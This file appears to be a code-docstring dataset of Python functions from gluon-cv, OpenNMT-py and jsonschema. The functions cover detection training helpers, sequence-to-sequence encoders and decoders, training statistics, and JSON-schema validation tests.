{"docstring": "\"\"\"Collect trainable params.\n\nThis function serves as a help utility function to return only\ntrainable parameters if predefined by experienced developer/researcher.\nFor example, if cross-device BatchNorm is not enabled, we will definitely\nwant to fix BatchNorm statistics to avoid scaling problem because RCNN training\nbatch size is usually very small.\n\nParameters\n----------\nselect : select : str\n    Regular expressions for parameter match pattern\n\nReturns\n-------\nThe selected :py:class:`mxnet.gluon.ParameterDict`\n\n\"\"\"\n", "func_signal": "def collect_train_params(self, select=None):\n", "code": "if select is None:\n    return self.collect_params(self.train_patterns)\nreturn self.collect_params(select)", "path": "gluon-cv/gluoncv/model_zoo/rcnn/rcnn.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Forward\"\"\"\n", "func_signal": "def forward(self, x, logits, ious):\n", "code": "F = nd\nnum_positive = F.sum(x > -1, axis=1)\nnum_negative = self._ratio * num_positive\nnum_total = x.shape[1]  # scalar\nnum_negative = F.minimum(F.maximum(self._min_samples, num_negative),\n                         num_total - num_positive)\npositive = logits.slice_axis(axis=2, begin=1, end=None)\nbackground = logits.slice_axis(axis=2, begin=0, end=1).reshape((0, -1))\nmaxval = positive.max(axis=2)\nesum = F.exp(logits - maxval.reshape((0, 0, 1))).sum(axis=2)\nscore = -F.log(F.exp(background - maxval) / esum)\nmask = F.ones_like(score) * -1\nscore = F.where(x < 0, score, mask)  # mask out positive samples\nif len(ious.shape) == 3:\n    ious = F.max(ious, axis=2)\nscore = F.where(ious < self._thresh, score, mask)  # mask out if iou is large\nargmaxs = F.argsort(score, axis=1, is_ascend=False)\n\n# neg number is different in each batch, using dynamic numpy operations.\ny = np.zeros(x.shape)\ny[np.where(x.asnumpy() >= 0)] = 1  # assign positive samples\nargmaxs = argmaxs.asnumpy()\nfor i, num_neg in zip(range(x.shape[0]), num_negative.asnumpy().astype(np.int32)):\n    indices = argmaxs[i, :num_neg]\n    y[i, indices.astype(np.int32)] = -1  # assign negative samples\nreturn F.array(y, ctx=x.context)", "path": "gluon-cv/gluoncv/nn/sampler.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Set NMS parameters to the network.\n\n.. Note::\n    If you are using hybrid mode, make sure you re-hybridize after calling\n    ``set_nms``.\n\nParameters\n----------\nnms_thresh : float, default is 0.3.\n    Non-maximum suppression threshold. You can specify < 0 or > 1 to disable NMS.\nnms_topk : int, default is 400\n    Apply NMS to top k detection results, use -1 to disable so that every Detection\n     result is used in NMS.\nforce_nms : bool, default is False\n    Appy NMS to all categories, this is to avoid overlapping detection results\n    from different categories.\n\nReturns\n-------\nNone\n\n\"\"\"\n", "func_signal": "def set_nms(self, nms_thresh=0.3, nms_topk=400, force_nms=False, post_nms=100):\n", "code": "self._clear_cached_op()\nself.nms_thresh = nms_thresh\nself.nms_topk = nms_topk\nself.force_nms = force_nms\nself.post_nms = post_nms", "path": "gluon-cv/gluoncv/model_zoo/rcnn/rcnn.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"\nPre-process data\n--------------------\n\nNext we need a video or video frame\nif you want to test video frame, you can change opt.video_loader to False\nand opt.data-dir is your video frame path.\nmeanwhile you need first frame object coordinates in opt.gt-bbox\ngt_bbox is first frame object coordinates, and it is bbox(center_x,center_y,weight,height)\n\"\"\"\n", "func_signal": "def read_data(opt):\n", "code": "video_frames = []\nif opt.video_loader:\n    im_video = utils.download(opt.video_path)\n    cap = cv2.VideoCapture(im_video)\n    while(True):\n        ret, img = cap.read()\n        if not ret:\n            break\n        video_frames.append(img)\nelse:\n    for data in sorted(os.listdir(opt.data_dir)):\n        video_frames.append(cv2.imread(os.path.join(opt.data_dir, data)))\nreturn video_frames", "path": "gluon-cv/scripts/tracking/siamrpn/demo.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"split and load data in GPU\"\"\"\n", "func_signal": "def train_batch_fn(data, ctx):\n", "code": "template = split_and_load(data[0], ctx_list=ctx, batch_axis=0)\nsearch = split_and_load(data[1], ctx_list=ctx, batch_axis=0)\nlabel_cls = split_and_load(data[2], ctx_list=ctx, batch_axis=0)\nlabel_loc = split_and_load(data[3], ctx_list=ctx, batch_axis=0)\nlabel_loc_weight = split_and_load(data[4], ctx_list=ctx, batch_axis=0)\nreturn template, search, label_cls, label_loc, label_loc_weight", "path": "gluon-cv/docs/tutorials/tracking/train_siamrpn.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Encode class prediction labels for SigmoidCrossEntropy Loss.\n\nParameters\n----------\nsamples : np.array\n    Sampling results with shape (B, N), 1:pos, 0:ignore, -1:negative\n\nReturns\n-------\n(mxnet.nd.NDArray, mxnet.nd.NDArray)\n    (target, mask)\n    target is the output label with shape (B, N), 1: pos, 0: negative, -1: ignore\n    mask is the mask for label, -1(ignore) labels have mask 0, otherwise mask is 1.\n\n\"\"\"\n# notation from samples, 1:pos, 0:ignore, -1:negative\n", "func_signal": "def __call__(self, samples):\n", "code": "target = (samples + 1) / 2.\ntarget = np.where(np.abs(samples) < 1e-5, -1, target)\n# output: 1: pos, 0: negative, -1: ignore\nmask = np.where(np.abs(samples) > 1e-5, 1.0, 0.0)\nreturn target, mask", "path": "gluon-cv/gluoncv/nn/coder.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Forward hidden state through bridge.\"\"\"\n", "func_signal": "def _bridge(self, hidden):\n", "code": "def bottle_hidden(linear, states):\n    \"\"\"\n    Transform from 3D to 2D, apply linear and return initial size\n    \"\"\"\n    size = states.size()\n    result = linear(states.view(-1, self.total_hidden_dim))\n    return F.relu(result).view(size)\n\nif isinstance(hidden, tuple):  # LSTM\n    outs = tuple([bottle_hidden(layer, hidden[ix])\n                  for ix, layer in enumerate(self.bridge)])\nelse:\n    outs = bottle_hidden(self.bridge[0], hidden)\nreturn outs", "path": "OpenNMT-py/onmt/encoders/rnn_encoder.py", "commit_date": "2019-05-16 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"\nUpdate statistics by suming values with another `Statistics` object\n\nArgs:\n    stat: another statistic object\n    update_n_src_words(bool): whether to update (sum) `n_src_words`\n        or not\n\n\"\"\"\n", "func_signal": "def update(self, stat, update_n_src_words=False):\n", "code": "self.loss += stat.loss\nself.n_words += stat.n_words\nself.n_correct += stat.n_correct\n\nif update_n_src_words:\n    self.n_src_words += stat.n_src_words", "path": "OpenNMT-py/onmt/utils/statistics.py", "commit_date": "2020-09-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\" display statistics to tensorboard \"\"\"\n", "func_signal": "def log_tensorboard(self, prefix, writer, learning_rate, patience, step):\n", "code": "t = self.elapsed_time()\nwriter.add_scalar(prefix + \"/xent\", self.xent(), step)\nwriter.add_scalar(prefix + \"/ppl\", self.ppl(), step)\nwriter.add_scalar(prefix + \"/accuracy\", self.accuracy(), step)\nwriter.add_scalar(prefix + \"/tgtper\", self.n_words / t, step)\nwriter.add_scalar(prefix + \"/lr\", learning_rate, step)\nif patience is not None:\n    writer.add_scalar(prefix + \"/patience\", patience, step)", "path": "OpenNMT-py/onmt/utils/statistics.py", "commit_date": "2020-09-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Alternate constructor.\"\"\"\n", "func_signal": "def from_opt(cls, opt, embeddings):\n", "code": "return cls(\n    opt.dec_layers,\n    opt.dec_rnn_size,\n    opt.global_attention,\n    opt.copy_attn,\n    opt.cnn_kernel_width,\n    opt.dropout[0] if type(opt.dropout) is list else opt.dropout,\n    embeddings,\n    opt.copy_attn_type)", "path": "OpenNMT-py/onmt/decoders/cnn_decoder.py", "commit_date": "2019-05-16 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"\nRead an embeddings file in the glove format.\n\"\"\"\n", "func_signal": "def read_embeddings(path, skip_lines=0, filter_set=None):\n", "code": "embs = dict()\ntotal_vectors_in_file = 0\nwith open(path, 'rb') as f:\n    for i, line in enumerate(f):\n        if i < skip_lines:\n            continue\n        if not line:\n            break\n        if len(line) == 0:\n            # is this reachable?\n            continue\n\n        l_split = line.decode('utf8').strip().split(' ')\n        if len(l_split) == 2:\n            continue\n        total_vectors_in_file += 1\n        if filter_set is not None and l_split[0] not in filter_set:\n            continue\n        embs[l_split[0]] = [float(em) for em in l_split[1:]]\nreturn embs, total_vectors_in_file", "path": "OpenNMT-py/onmt/modules/embeddings.py", "commit_date": "2020-12-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Alternate constructor.\"\"\"\n", "func_signal": "def from_opt(cls, opt, embeddings):\n", "code": "return cls(\n    opt.rnn_type,\n    opt.brnn,\n    opt.dec_layers,\n    opt.dec_rnn_size,\n    opt.global_attention,\n    opt.global_attention_function,\n    opt.coverage_attn,\n    opt.context_gate,\n    opt.copy_attn,\n    opt.dropout[0] if type(opt.dropout) is list\n    else opt.dropout,\n    embeddings,\n    opt.reuse_copy_attn,\n    opt.copy_attn_type)", "path": "OpenNMT-py/onmt/decoders/decoder.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\" See :obj:`onmt.modules.RNNDecoderBase.forward()`\"\"\"\n\n", "func_signal": "def forward(self, tgt, memory_bank, step=None, **kwargs):\n", "code": "if self.state[\"previous_input\"] is not None:\n    tgt = torch.cat([self.state[\"previous_input\"], tgt], 0)\n\ndec_outs = []\nattns = {\"std\": []}\nif self.copy_attn is not None:\n    attns[\"copy\"] = []\n\nemb = self.embeddings(tgt)\nassert emb.dim() == 3  # len x batch x embedding_dim\n\ntgt_emb = emb.transpose(0, 1).contiguous()\n# The output of CNNEncoder.\nsrc_memory_bank_t = memory_bank.transpose(0, 1).contiguous()\n# The combination of output of CNNEncoder and source embeddings.\nsrc_memory_bank_c = self.state[\"src\"].transpose(0, 1).contiguous()\n\nemb_reshape = tgt_emb.contiguous().view(\n    tgt_emb.size(0) * tgt_emb.size(1), -1)\nlinear_out = self.linear(emb_reshape)\nx = linear_out.view(tgt_emb.size(0), tgt_emb.size(1), -1)\nx = shape_transform(x)\n\npad = torch.zeros(x.size(0), x.size(1), self.cnn_kernel_width - 1, 1)\n\npad = pad.type_as(x)\nbase_target_emb = x\n\nfor conv, attention in zip(self.conv_layers, self.attn_layers):\n    new_target_input = torch.cat([pad, x], 2)\n    out = conv(new_target_input)\n    c, attn = attention(base_target_emb, out,\n                        src_memory_bank_t, src_memory_bank_c)\n    x = (x + (c + out) * SCALE_WEIGHT) * SCALE_WEIGHT\noutput = x.squeeze(3).transpose(1, 2)\n\n# Process the result and update the attentions.\ndec_outs = output.transpose(0, 1).contiguous()\nif self.state[\"previous_input\"] is not None:\n    dec_outs = dec_outs[self.state[\"previous_input\"].size(0):]\n    attn = attn[:, self.state[\"previous_input\"].size(0):].squeeze()\n    attn = torch.stack([attn])\nattns[\"std\"] = attn\nif self.copy_attn is not None:\n    attns[\"copy\"] = attn\n\n# Update the state.\nself.state[\"previous_input\"] = tgt\n# TODO change the way attns is returned dict => list or tuple (onnx)\nreturn dec_outs, attns", "path": "OpenNMT-py/onmt/decoders/cnn_decoder.py", "commit_date": "2019-05-16 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Alternate constructor.\"\"\"\n", "func_signal": "def from_opt(cls, opt, embeddings):\n", "code": "return cls(\n    opt.rnn_type,\n    opt.brnn,\n    opt.enc_layers,\n    opt.enc_rnn_size,\n    opt.dropout[0] if type(opt.dropout) is list else opt.dropout,\n    embeddings,\n    opt.bridge)", "path": "OpenNMT-py/onmt/encoders/rnn_encoder.py", "commit_date": "2019-05-16 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Init decoder state.\"\"\"\n", "func_signal": "def init_state(self, _, memory_bank, enc_hidden):\n", "code": "self.state[\"src\"] = (memory_bank + enc_hidden) * SCALE_WEIGHT\nself.state[\"previous_input\"] = None", "path": "OpenNMT-py/onmt/decoders/cnn_decoder.py", "commit_date": "2019-05-16 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"\nSee StdRNNDecoder._run_forward_pass() for description\nof arguments and return values.\n\"\"\"\n# Additional args check.\n", "func_signal": "def _run_forward_pass(self, tgt, memory_bank, memory_lengths=None):\n", "code": "input_feed = self.state[\"input_feed\"].squeeze(0)\ninput_feed_batch, _ = input_feed.size()\n_, tgt_batch, _ = tgt.size()\naeq(tgt_batch, input_feed_batch)\n# END Additional args check.\n\ndec_outs = []\nattns = {}\nif self.attn is not None:\n    attns[\"std\"] = []\nif self.copy_attn is not None or self._reuse_copy_attn:\n    attns[\"copy\"] = []\nif self._coverage:\n    attns[\"coverage\"] = []\n\nemb = self.embeddings(tgt)\nassert emb.dim() == 3  # len x batch x embedding_dim\n\ndec_state = self.state[\"hidden\"]\ncoverage = self.state[\"coverage\"].squeeze(0) \\\n    if self.state[\"coverage\"] is not None else None\n\n# Input feed concatenates hidden state with\n# input at every time step.\nfor emb_t in emb.split(1):\n    decoder_input = torch.cat([emb_t.squeeze(0), input_feed], 1)\n    rnn_output, dec_state = self.rnn(decoder_input, dec_state)\n    if self.attentional:\n        decoder_output, p_attn = self.attn(\n            rnn_output,\n            memory_bank.transpose(0, 1),\n            memory_lengths=memory_lengths)\n        attns[\"std\"].append(p_attn)\n    else:\n        decoder_output = rnn_output\n    if self.context_gate is not None:\n        # TODO: context gate should be employed\n        # instead of second RNN transform.\n        decoder_output = self.context_gate(\n            decoder_input, rnn_output, decoder_output\n        )\n    decoder_output = self.dropout(decoder_output)\n    input_feed = decoder_output\n\n    dec_outs += [decoder_output]\n\n    # Update the coverage attention.\n    if self._coverage:\n        coverage = p_attn if coverage is None else p_attn + coverage\n        attns[\"coverage\"] += [coverage]\n\n    if self.copy_attn is not None:\n        _, copy_attn = self.copy_attn(\n            decoder_output, memory_bank.transpose(0, 1))\n        attns[\"copy\"] += [copy_attn]\n    elif self._reuse_copy_attn:\n        attns[\"copy\"] = attns[\"std\"]\n\nreturn dec_state, dec_outs, attns", "path": "OpenNMT-py/onmt/decoders/decoder.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"\nGather a `Statistics` object accross multiple process/nodes\n\nArgs:\n    stat(:obj:Statistics): the statistics object to gather\n        accross all processes/nodes\n    max_size(int): max buffer size to use\n\nReturns:\n    `Statistics`, the update stats object\n\"\"\"\n", "func_signal": "def all_gather_stats(stat, max_size=4096):\n", "code": "stats = Statistics.all_gather_stats_list([stat], max_size=max_size)\nreturn stats[0]", "path": "OpenNMT-py/onmt/utils/statistics.py", "commit_date": "2020-09-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"\nGather a `Statistics` list accross all processes/nodes\n\nArgs:\n    stat_list(list([`Statistics`])): list of statistics objects to\n        gather accross all processes/nodes\n    max_size(int): max buffer size to use\n\nReturns:\n    our_stats(list([`Statistics`])): list of updated stats\n\"\"\"\n", "func_signal": "def all_gather_stats_list(stat_list, max_size=4096):\n", "code": "from torch.distributed import get_rank\nfrom onmt.utils.distributed import all_gather_list\n\n# Get a list of world_size lists with len(stat_list) Statistics objects\nall_stats = all_gather_list(stat_list, max_size=max_size)\n\nour_rank = get_rank()\nour_stats = all_stats[our_rank]\nfor other_rank, stats in enumerate(all_stats):\n    if other_rank == our_rank:\n        continue\n    for i, stat in enumerate(stats):\n        our_stats[i].update(stat, update_n_src_words=True)\nreturn our_stats", "path": "OpenNMT-py/onmt/utils/statistics.py", "commit_date": "2020-09-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Write out statistics to stdout.\n\nArgs:\n   step (int): current step\n   n_batch (int): total batches\n   start (int): start time of step.\n\"\"\"\n", "func_signal": "def output(self, step, num_steps, learning_rate, start):\n", "code": "t = self.elapsed_time()\nstep_fmt = \"%2d\" % step\nif num_steps > 0:\n    step_fmt = \"%s/%5d\" % (step_fmt, num_steps)\nlogger.info(\n    (\"Step %s; acc: %6.2f; ppl: %5.2f; xent: %4.2f; \" +\n     \"lr: %7.5f; %3.0f/%3.0f tok/s; %6.0f sec\")\n    % (step_fmt,\n       self.accuracy(),\n       self.ppl(),\n       self.xent(),\n       learning_rate,\n       self.n_src_words / (t + 1e-5),\n       self.n_words / (t + 1e-5),\n       time.time() - start))\nsys.stdout.flush()", "path": "OpenNMT-py/onmt/utils/statistics.py", "commit_date": "2020-09-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Embed inputs.\n\nArgs:\n    emb (FloatTensor): Sequence of word vectors\n        ``(seq_len, batch_size, self.dim)``\n    step (int or NoneType): If stepwise (``seq_len = 1``), use\n        the encoding for this position.\n\"\"\"\n\n", "func_signal": "def forward(self, emb, step=None):\n", "code": "emb = emb * math.sqrt(self.dim)\nif step is None:\n    if self.pe.size(0) < emb.size(0):\n        raise SequenceTooLongError(\n            f\"Sequence is {emb.size(0)} but PositionalEncoding is\"\n            f\" limited to {self.pe.size(0)}. See max_len argument.\"\n        )\n    emb = emb + self.pe[:emb.size(0)]\nelse:\n    emb = emb + self.pe[step]\nemb = self.dropout(emb)\nreturn emb", "path": "OpenNMT-py/onmt/modules/embeddings.py", "commit_date": "2020-12-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"See :func:`EncoderBase.forward()`\"\"\"\n", "func_signal": "def forward(self, src, lengths=None):\n", "code": "self._check_args(src, lengths)\n\nemb = self.embeddings(src)\n# s_len, batch, emb_dim = emb.size()\n\npacked_emb = emb\nif lengths is not None and not self.no_pack_padded_seq:\n    # Lengths data is wrapped inside a Tensor.\n    lengths_list = lengths.view(-1).tolist()\n    packed_emb = pack(emb, lengths_list)\n\nmemory_bank, encoder_final = self.rnn(packed_emb)\n\nif lengths is not None and not self.no_pack_padded_seq:\n    memory_bank = unpack(memory_bank)[0]\n\nif self.use_bridge:\n    encoder_final = self._bridge(encoder_final)\nreturn encoder_final, memory_bank, lengths", "path": "OpenNMT-py/onmt/encoders/rnn_encoder.py", "commit_date": "2019-05-16 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Load in pretrained embeddings.\n\nArgs:\n  emb_file (str) : path to torch serialized embeddings\n\"\"\"\n\n", "func_signal": "def load_pretrained_vectors(self, emb_file):\n", "code": "if emb_file:\n    pretrained = torch.load(emb_file)\n    pretrained_vec_size = pretrained.size(1)\n    if self.word_vec_size > pretrained_vec_size:\n        self.word_lut.weight.data[:, :pretrained_vec_size] = pretrained\n    elif self.word_vec_size < pretrained_vec_size:\n        self.word_lut.weight.data \\\n            .copy_(pretrained[:, :self.word_vec_size])\n    else:\n        self.word_lut.weight.data.copy_(pretrained)", "path": "OpenNMT-py/onmt/modules/embeddings.py", "commit_date": "2020-12-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Computes the embeddings for words and features.\n\nArgs:\n    source (LongTensor): index tensor ``(len, batch, nfeat)``\n\nReturns:\n    FloatTensor: Word embeddings ``(len, batch, embedding_size)``\n\"\"\"\n\n", "func_signal": "def forward(self, source, step=None):\n", "code": "if self.position_encoding:\n    for i, module in enumerate(self.make_embedding._modules.values()):\n        if i == len(self.make_embedding._modules.values()) - 1:\n            source = module(source, step=step)\n        else:\n            source = module(source)\nelse:\n    source = self.make_embedding(source)\n\nreturn source", "path": "OpenNMT-py/onmt/modules/embeddings.py", "commit_date": "2020-12-03 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"\nPrivate helper for running the specific RNN forward pass.\nMust be overriden by all subclasses.\n\nArgs:\n    tgt (LongTensor): a sequence of input tokens tensors\n        ``(len, batch, nfeats)``.\n    memory_bank (FloatTensor): output(tensor sequence) from the\n        encoder RNN of size ``(src_len, batch, hidden_size)``.\n    memory_lengths (LongTensor): the source memory_bank lengths.\n\nReturns:\n    (Tensor, List[FloatTensor], Dict[str, List[FloatTensor]):\n\n    * dec_state: final hidden state from the decoder.\n    * dec_outs: an array of output of every time\n      step from the decoder.\n    * attns: a dictionary of different\n      type of attention Tensor array of every time\n      step from the decoder.\n\"\"\"\n\n", "func_signal": "def _run_forward_pass(self, tgt, memory_bank, memory_lengths=None):\n", "code": "assert self.copy_attn is None  # TODO, no support yet.\nassert not self._coverage  # TODO, no support yet.\n\nattns = {}\nemb = self.embeddings(tgt)\n\nif isinstance(self.rnn, nn.GRU):\n    rnn_output, dec_state = self.rnn(emb, self.state[\"hidden\"][0])\nelse:\n    rnn_output, dec_state = self.rnn(emb, self.state[\"hidden\"])\n\n# Check\ntgt_len, tgt_batch, _ = tgt.size()\noutput_len, output_batch, _ = rnn_output.size()\naeq(tgt_len, output_len)\naeq(tgt_batch, output_batch)\n\n# Calculate the attention.\nif not self.attentional:\n    dec_outs = rnn_output\nelse:\n    dec_outs, p_attn = self.attn(\n        rnn_output.transpose(0, 1).contiguous(),\n        memory_bank.transpose(0, 1),\n        memory_lengths=memory_lengths\n    )\n    attns[\"std\"] = p_attn\n\n# Calculate the context gate.\nif self.context_gate is not None:\n    dec_outs = self.context_gate(\n        emb.view(-1, emb.size(2)),\n        rnn_output.view(-1, rnn_output.size(2)),\n        dec_outs.view(-1, dec_outs.size(2))\n    )\n    dec_outs = dec_outs.view(tgt_len, tgt_batch, self.hidden_size)\n\ndec_outs = self.dropout(dec_outs)\nreturn dec_state, dec_outs, attns", "path": "OpenNMT-py/onmt/decoders/decoder.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"\nWrapper to apply str function to the proper key of return_dict.\n\"\"\"\n", "func_signal": "def wrap_str_func(func):\n", "code": "def wrapper(some_dict):\n    some_dict[\"seg\"] = [func(item) for item in some_dict[\"seg\"]]\n    return some_dict\nreturn wrapper", "path": "OpenNMT-py/onmt/translate/process_zh.py", "commit_date": "2020-03-27 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "\"\"\"Initialize decoder state with last state of the encoder.\"\"\"\n", "func_signal": "def init_state(self, src, memory_bank, encoder_final):\n", "code": "def _fix_enc_hidden(hidden):\n    # The encoder hidden is  (layers*directions) x batch x dim.\n    # We need to convert it to layers x batch x (directions*dim).\n    if self.bidirectional_encoder:\n        hidden = torch.cat([hidden[0:hidden.size(0):2],\n                            hidden[1:hidden.size(0):2]], 2)\n    return hidden\n\nif isinstance(encoder_final, tuple):  # LSTM\n    self.state[\"hidden\"] = tuple(_fix_enc_hidden(enc_hid)\n                                 for enc_hid in encoder_final)\nelse:  # GRU\n    self.state[\"hidden\"] = (_fix_enc_hidden(encoder_final), )\n\n# Init the input feed.\nbatch_size = self.state[\"hidden\"][0].size(1)\nh_size = (batch_size, self.hidden_size)\nself.state[\"input_feed\"] = \\\n    self.state[\"hidden\"][0].data.new(*h_size).zero_().unsqueeze(0)\nself.state[\"coverage\"] = None", "path": "OpenNMT-py/onmt/decoders/decoder.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "OpenNMT/OpenNMT-py", "stars": 6495, "license": "mit", "language": "python", "size": 321461}
{"docstring": "# bool inherits from int, so ensure bools aren't reported as ints\n", "func_signal": "def is_integer(checker, instance):\n", "code": "if isinstance(instance, bool):\n    return False\nreturn isinstance(instance, int)", "path": "jsonschema/jsonschema/_types.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nOnly the schema error is reported, as we abort immediately.\n\"\"\"\n", "func_signal": "def test_schema_and_instance_are_both_invalid_JSON(self):\n", "code": "schema, instance = \"not valid JSON!\", \"also not valid JSON!\"\nself.assertOutputs(\n    files=dict(some_schema=schema, some_instance=instance),\n\n    argv=[\"some_schema\"],\n\n    exit_code=1,\n    stderr=\"\"\"\\\n        Failed to parse 'some_schema': {}\n    \"\"\".format(_message_for(schema)),\n)", "path": "jsonschema/jsonschema/tests/test_cli.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nIf the most relevant error is an oneOf, then we traverse its context\nand select the otherwise *least* relevant error, since in this case\nthat means the most specific, deep, error inside the instance.\n\nI.e. since only one of the schemas must match, we look for the most\nrelevant one.\n\"\"\"\n\n", "func_signal": "def test_if_the_most_relevant_error_is_oneOf_it_is_traversed(self):\n", "code": "validator = Draft4Validator(\n    {\n        \"properties\": {\n            \"foo\": {\n                \"oneOf\": [\n                    {\"type\": \"string\"},\n                    {\"properties\": {\"bar\": {\"type\": \"array\"}}},\n                ],\n            },\n        },\n    },\n)\nbest = self.best_match(validator.iter_errors({\"foo\": {\"bar\": 12}}))\nself.assertEqual(best.validator_value, \"array\")", "path": "jsonschema/jsonschema/tests/test_exceptions.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nSpecifically, `const` validation applies for Draft 7.\n\"\"\"\n", "func_signal": "def test_it_validates_using_draft7_when_specified(self):\n", "code": "schema = \"\"\"\n    {\n        \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n        \"const\": \"check\"\n    }\n\"\"\"\ninstance = '\"foo\"'\nself.assertOutputs(\n    files=dict(some_schema=schema, some_instance=instance),\n    argv=[\"-i\", \"some_instance\", \"some_schema\"],\n    exit_code=1,\n    stdout=\"\",\n    stderr=\"foo: 'check' was expected\\n\",\n)", "path": "jsonschema/jsonschema/tests/test_cli.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nNow, if the error is allOf, we traverse but select the *most* relevant\nerror from the context, because all schemas here must match anyways.\n\"\"\"\n\n", "func_signal": "def test_if_the_most_relevant_error_is_allOf_it_is_traversed(self):\n", "code": "validator = Draft4Validator(\n    {\n        \"properties\": {\n            \"foo\": {\n                \"allOf\": [\n                    {\"type\": \"string\"},\n                    {\"properties\": {\"bar\": {\"type\": \"array\"}}},\n                ],\n            },\n        },\n    },\n)\nbest = self.best_match(validator.iter_errors({\"foo\": {\"bar\": 12}}))\nself.assertEqual(best.validator_value, \"string\")", "path": "jsonschema/jsonschema/tests/test_exceptions.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "# There isn't a better way now I can think of to ensure that the\n# latest version was used, given that the call to validator_for\n# is hidden inside the CLI, so guard that that's the case, and\n# this test will have to be updated when versions change until\n# we can think of a better way to ensure this behavior.\n", "func_signal": "def test_it_validates_using_the_latest_validator_when_unspecified(self):\n", "code": "self.assertIs(Draft7Validator, _LATEST_VERSION)\n\nself.assertOutputs(\n    files=dict(some_schema='{\"const\": \"check\"}', some_instance='\"a\"'),\n    argv=[\"-i\", \"some_instance\", \"some_schema\"],\n    exit_code=1,\n    stdout=\"\",\n    stderr=\"a: 'check' was expected\\n\",\n)", "path": "jsonschema/jsonschema/tests/test_cli.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
